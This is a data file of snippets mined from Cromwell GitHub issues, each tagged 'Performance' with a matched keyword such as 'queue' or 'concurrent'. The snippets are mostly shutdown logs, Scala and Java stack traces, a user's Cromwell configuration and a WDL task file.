Performance,":41,15] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-08-30 17:53:41,15] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-08-30 17:53:41,15] [info] JobExecutionTokenDispenser stopped; [2018-08-30 17:53:41,17] [info] WorkflowLogCopyRouter stopped; [2018-08-30 17:53:41,17] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-08-30 17:53:41,17] [info] WorkflowManagerActor All workflows finished; [2018-08-30 17:53:41,17] [info] WorkflowManagerActor stopped; [2018-08-30 17:53:41,17] [info] Connection pools shut down; [2018-08-30 17:53:41,18] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-08-30 17:53:41,18] [info] SubWorkflowStoreActor stopped; [2018-08-30 17:53:41,18] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-08-30 17:53:41,18] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-08-30 17:53:41,19] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-08-30 17:53:41,19] [info] CallCacheWriteActor stopped; [2018-08-30 17:53:41,18] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-08-30 17:53:41,19] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-08-30 17:53:41,19] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-08-30 17:53:41,19] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-08-30 17:53:41,19] [info] DockerHashActor stopped; [2018-08-30 17:53:41,19] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-08-30 17:53:41,19] [info] JobStoreActor stopped; [2018-08-30 17:53:41,19] [info] IoProxy stopped; [2018-08-30 17:53:41,19] [info] ServiceRegistryActor stopped; [2018-08-30 17:53:41,23] [info] Database closed; [2018-08-30 17:53:41,23] [info] Stream materializer shut down; [2018-08-30 17:53:41,29] [info] Automatic shutdown of the async connection; [2018-08-30 17:53:41,29] [info] Gracefully shutdown sentr",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4062:5711,queue,queued,5711,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4062,1,['queue'],['queued']
Performance,":55:17,31] [info] Aborting all running workflows.; [2023-02-04 08:55:17,31] [info] JobExecutionTokenDispenser stopped; [2023-02-04 08:55:17,31] [info] WorkflowStoreActor stopped; [2023-02-04 08:55:17,32] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2023-02-04 08:55:17,32] [info] WorkflowLogCopyRouter stopped; [2023-02-04 08:55:17,32] [info] WorkflowManagerActor All workflows finished; [2023-02-04 08:55:17,32] [info] WorkflowManagerActor stopped; [2023-02-04 08:55:17,32] [info] Connection pools shut down; [2023-02-04 08:55:17,33] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] SubWorkflowStoreActor stopped; [2023-02-04 08:55:17,33] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] JobStoreActor stopped; [2023-02-04 08:55:17,33] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2023-02-04 08:55:17,33] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] CallCacheWriteActor stopped; [2023-02-04 08:55:17,33] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2023-02-04 08:55:17,33] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] KvWriteActor Shutting down: 0 queued messages to process; [2023-02-04 08:55:17,33] [info] DockerHashActor stopped; [2023-02-04 08:55:17,34] [info] IoProxy stopped; [2023-02-04 08:55:17,34] [info] ServiceRegistryActor stopped; [2023-02-04 08:55:17,37] [info] Database closed; [2023-02-04 08:55:17,37] [info] Stream materializer shut down; [2023-02-04 08:55:17,40] [info] Automatic shutdown of the async connection; [2023-02-04 08:55:17,40] [info] Gracefully shutdown sentry threads.; [2023-02-04 08:55:17,40] [info] Shutdown finish",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6999:17350,queue,queued,17350,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6999,3,['queue'],['queued']
Performance,":799); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.processEvent(MaterializeWorkflowDescriptorActor.scala:116); 	at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:496); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.aroundReceive(MaterializeWorkflowDescriptorActor.scala:116); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2017-05-25 12:18:24,94] [info] WorkflowManagerActor WorkflowActor-e52409b4-c85a-4285-9453-f47c6b0ae86c is in a terminal state: WorkflowFailedState; [2017-05-25 12:18:24,94] [info] Message [cromwell.subworkflowstore.SubWorkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$c#-297741123] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-e52409b4-c85a-4285-9453-f47c6b0ae86c#772660809] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2017-05-25 12:18:26,88] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; Workflow e52409b4-c85a-4285-9453-f47c6b0ae86c transitioned to state Failed. I recognize the brackets are the problem, but the tutorial doesn't ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2296:2699,concurren,concurrent,2699,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2296,1,['concurren'],['concurrent']
Performance,:799); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.processEvent(MaterializeWorkflowDescriptorActor.scala:117); 	at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.aroundReceive(MaterializeWorkflowDescriptorActor.scala:117); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	Suppressed: java.nio.file.NoSuchFileException: /tmp/640585481854205084.zip4511378926145376874/bar/foo.wdl; 		at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); 		at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); 		at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107); 		at sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:214); 		at java.nio.file.Files.newByteChannel(Files.java:361); 		at java.nio.file.Files.newByteChannel(Files.java:407); 		at java.nio.file.Files.readAllBytes(Files.java:3152); 		at better.files.File.loadBytes(File.scala:163); 		at better.files.File.byteArray(File.scala:166); 		at better.files.File.contentAsString(File.scala:206); 		at wdl4s.WdlNamespace$.readFile(WdlNamespace.scala:525); 		at wdl4s.WdlNamespace$.fileResolver(WdlNamespace.scala:527); 		at wdl4s.WdlNamespace$.directoryResolver(WdlNamespace.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1958:4414,concurren,concurrent,4414,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1958,1,['concurren'],['concurrent']
Performance,":expanse_figures.CBL_assoc:-1:1-20000000025 [b303ae23expanse_figures.CBL_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 13:07:47,67] [info] BT-322 58e64982:expanse_figures.CBL_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = C3078AB9F63DD3A59655953B1975D6CF.; [2023-03-29 13:07:47,67] [info] 58e64982-cf3d-4e77-ad72-acfda8299d1b-EngineJobExecutionActor-expanse_figures.CBL_assoc:NA:1 [58e64982]: Call cache hit process had 0 total hit failures before completing successfully; ```. Can someone help me diagnose why call caching isn't near instantaneous, and what I can do to make it much faster? Happy to provide more information as necessary. Thanks!. Config:; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # this configuration only accepts double quotes! not singule quotes; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; file-hash-cache = true; }. # necessary for call result caching; # will need to stand up the MySQL server each time before running cromwell; # stand it up on the same node that's running cromwell; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; user = ""root""; password = ""pass""; connectionTimeout = 5000; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. docker {; hash-lookup {; enabled = true; method = ""remote""; }; }. backend {; # which backend do you want to use?; # Right now I don't know how to choose this via command line, only here; default = ""Local"" # For running jobs on an interactive node; #default = ""SLURM"" # For running jobs by submitting them from an interactive node to the cluster; providers { ; # For running jobs on an interactive node; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigB",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:3196,cache,cache,3196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['cache'],['cache']
Performance,"; 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2019-04-18 13:22:35,882 cromwell-system-akka.dispatchers.engine-dispatcher-42 ERROR - WorkflowManagerActor Workflow 4057b0c6-0019-4a00-b8af-e392fbf89697 failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.core.CromwellFatalException$.apply(core.scala:22); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:39); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run$$$capture(Promise.scala:60); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:4363,concurren,concurrent,4363,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['concurren'],['concurrent']
Performance,"; 2018-06-06 16:18:47,223 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - WorkflowManagerActor Successfully started WorkflowActor-948bf608-f91b-46a7-b892-86454be067fd; 2018-06-06 16:18:47,223 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-06 16:18:47,229 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - MaterializeWorkflowDescriptorActor [UUID(948bf608)]: Parsing workflow as WDL draft-2; 2018-06-06 16:18:47,232 cromwell-system-akka.dispatchers.engine-dispatcher-32 ERROR - WorkflowManagerActor Workflow 948bf608-f91b-46a7-b892-86454be067fd failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrE",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:1904,concurren,concurrent,1904,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['concurren'],['concurrent']
Performance,"; File covar_names_out = covar_names; File pheno_readme_out = pheno_readme; }; }; ```. tasks.wdl; ```; version 1.0. # any input file with a default relative to the script_dir; # needs to be supplied by the user, it won't be the product of another task; # if input files to tasks can be supplied by another tasks output, ; # there will be a comment specifying; # task input files without comments need to be supplied by the user; # see the expanse workflow for where those are on expanse; # exception: sc (data showcase) tasks are labeled by data field id; # but do need to be supplied by the user. # output files from tasks will be commented with the location; # they reside on expanse; # this isn't necessary for understanding/running the WDL, just useful notes for myself; # for transitioning from snakemake to WDL. # sample_list file format; # first line is 'ID' (case insensitive); # every successive line is a sample ID. # TODO: set container for each task. ####################### Loading samples and phenotypes ####################. task write_sample_list {; input {; String script_dir; File script = ""~{script_dir}/sample_qc/scripts/write_sample_list.py"". File sc; Int? value; }. output {; File data = ""data.out""; }. command <<<; ~{script} ~{sc} data.out ~{""--value "" + value}; >>>. runtime {; shortTask: true; dx_timeout: ""5m""; }; }. task ethnic_sample_lists {; input {; String script_dir; File script = ""~{script_dir}/sample_qc/scripts/ethnicity.py""; File python_array_utils = ""~{script_dir}/sample_qc/scripts/python_array_utils.py"". File white_brits_sample_list # write_sample_list 22006; File sc_ethnicity_self_report # 21000; } . output {; # sample_qc/common_filters/ethnicity/{ethnicity}.sample; Array[String] ethnicities = [; ""black"",; ""south_asian"",; ""chinese"",; ""irish"",; ""white_other"",; ]; # These can be zipped together to form a map if desired; Array[File] sample_lists = [; ""black.sample"",; ""south_asian.sample"",; ""chinese.sample"",; ""irish.sample"",; ""white_other.sample"",; ]; }. c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269:8747,Load,Loading,8747,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269,1,['Load'],['Loading']
Performance,"; [2018-10-23 17:49:32,18] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-10-23 17:49:32,19] [info] JobExecutionTokenDispenser stopped; [2018-10-23 17:49:32,19] [info] WorkflowStoreActor stopped; [2018-10-23 17:49:32,20] [info] WorkflowLogCopyRouter stopped; [2018-10-23 17:49:32,20] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-10-23 17:49:32,20] [info] WorkflowManagerActor All workflows finished; [2018-10-23 17:49:32,20] [info] Connection pools shut down; [2018-10-23 17:49:32,20] [info] WorkflowManagerActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] SubWorkflowStoreActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-10-23 17:49:32,21] [info] JobStoreActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-10-23 17:49:32,21] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-10-23 17:49:32,21] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-10-23 17:49:32,22] [info] ServiceRegistryActor stopped; [2018-10-23 17:49:32,22] [info] CallCacheWriteActor stopped; [2018-10-23 17:49:32,23] [info] DockerHashActor stopped; [2018-10-23 17:49:32,23] [info] IoProxy stopped; [2018-10-23 17:49:32,26] [info] Database closed; [2018-10-23 17:49:32,26] [info] Stream materializer shut down; [2018-10-23 17:49:32,27] [info] WDL HTTP import resolver closed; Workflow d186ca94-b85b-4729-befc-8ad28a05976c transitioned to state Failed; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:8609,queue,queued,8609,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,6,['queue'],['queued']
Performance,"; [2019-01-07 16:21:33,03] [info] WorkflowStoreActor stopped; [2019-01-07 16:21:33,03] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2019-01-07 16:21:33,05] [info] JobExecutionTokenDispenser stopped; [2019-01-07 16:21:33,05] [info] WorkflowLogCopyRouter stopped; [2019-01-07 16:21:33,05] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2019-01-07 16:21:33,05] [info] WorkflowManagerActor All workflows finished; [2019-01-07 16:21:33,05] [info] WorkflowManagerActor stopped; [2019-01-07 16:21:33,05] [info] Connection pools shut down; [2019-01-07 16:21:33,07] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2019-01-07 16:21:33,07] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2019-01-07 16:21:33,08] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2019-01-07 16:21:33,08] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2019-01-07 16:21:33,08] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2019-01-07 16:21:33,08] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2019-01-07 16:21:33,08] [info] SubWorkflowStoreActor stopped; [2019-01-07 16:21:33,08] [info] JobStoreActor stopped; [2019-01-07 16:21:33,08] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2019-01-07 16:21:33,08] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2019-01-07 16:21:33,09] [info] KvWriteActor Shutting down: 0 queued messages to process; [2019-01-07 16:21:33,09] [info] DockerHashActor stopped; [2019-01-07 16:21:33,09] [info] CallCacheWriteActor stopped; [2019-01-07 16:21:33,09] [info] ServiceRegistryActor stopped; [2019-01-07 16:21:33,10] [info] IoProxy stopped; [2019-01-07 16:21:33,14] [info] Database closed; [2019-01-07 16:21:33,14] [info] Stream materializer shut down; [2019-01-07 16:21:33,15] [info] WDL HTTP import resolver closed; Workflow 18de8166-5f29-4288-9fa4-6741565446fd transitioned to state Failed; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4526:8586,queue,queued,8586,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4526,3,['queue'],['queued']
Performance,; at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.wrap(ReferenceCountedOpenSslEngine.java:834); at java.base/javax.net.ssl.SSLEngine.wrap(SSLEngine.java:564); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.wrap(SslHandler.java:1041); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.wrapNonAppData(SslHandler.java:927); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1409); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.unwrapNonAppData(SslHandler.java:1327); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.access$1800(SslHandler.java:169); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.resumeOnEventExecutor(SslHandler.java:1718); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.access$2000(SslHandler.java:1609); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner$2.run(SslHandler.java:1770); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:174); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXV,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:6087,concurren,concurrent,6087,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['concurren'],['concurrent']
Performance,"; at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:157); - locked <0x00000006c00301d8> (a java.lang.ref.Reference$Lock). ""main"" #1 prio=5 os_prio=31 tid=0x00007fb76a803000 nid=0xf07 waiting on condition [0x000000010b088000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c061d308> (a scala.concurrent.impl.Promise$CompletionLatch); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at scala.concurrent.impl.Promise$DefaultPromise.tryAwait(Promise.scala:199); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala); at scala.concurrent.Await$.ready(package.scala:169); at cromwell.Main.cromwell$Main$$waitAndExit(Main.scala); at cromwell.Main$$anonfun$runServer$2.apply$mcI$sp(Main.scala:109); at cromwell.Main.continueIf(Main.scala); at cromwell.Main.runServer(Main.scala:109); at cromwell.Main.runAction(Main.scala:103); at cromwell.Main$.delayedEndpoint$cromwell$Main$1(Main.scala:49); at cromwell.Main$delayedInit$body.apply(Main.scala); at scala.Function0$class.apply$mcV$sp(Function0.scala); at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala); at scala.App$$anonfun$main$1.apply(App.scala); at scala.App$$anonfun$main$1.apply(App.scala); at scala.collection.immutable.List.foreach(List.scala:380); at scala.collection.ge",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:51075,concurren,concurrent,51075,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"; at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-2"" #28 daemon prio=5 os_prio=31 tid=0x00007fb7708d7800 nid=0x7d03 waiting on condition [0x000000012c789000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""pool-1-thread-1"" #27 prio=5 os_prio=31 tid=0x00007fb76f4b6000 nid=0x7b03 waiting on condition [0x000000012b643000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:38693,concurren,concurrent,38693,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
